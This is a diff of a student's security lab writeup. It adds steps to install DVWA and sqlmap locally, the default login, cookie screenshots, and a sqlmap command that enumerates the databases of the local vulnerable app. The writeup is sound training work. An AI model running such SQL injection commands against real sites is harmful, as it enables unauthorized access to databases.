@@ -189,10 +189,41 @@ After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, n
 - Install dvwa (on host machine or docker container)
 - Make sure you can login with default user
 - Install sqlmap
-- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 
+- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
+## Setup lab
+### 1. Setup dwa
+```
+git clone https://github.com/digininja/DVWA
+```
+### 2. Setup sqlmap
+
+```
+git clone https://github.com/sqlmapproject/sqlmap
+```
+### Localhost : http://localhost:4280/security.php
+![image](https://github.com/user-attachments/assets/40c856df-07ac-4798-8f11-42adb64d8bc7)
+
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
+### 1. Login
+User : admin <br>
+Password: password <br>
+
+### 2. Get cookies
+
+![image](https://github.com/user-attachments/assets/8309fd16-9816-4ab3-a9ff-c21f58b105f5)
+
+![image](https://github.com/user-attachments/assets/d61bfb48-94e2-463d-a946-660cccae2803)
+
+
+### 3. Attack
+
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
+```
+
+
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
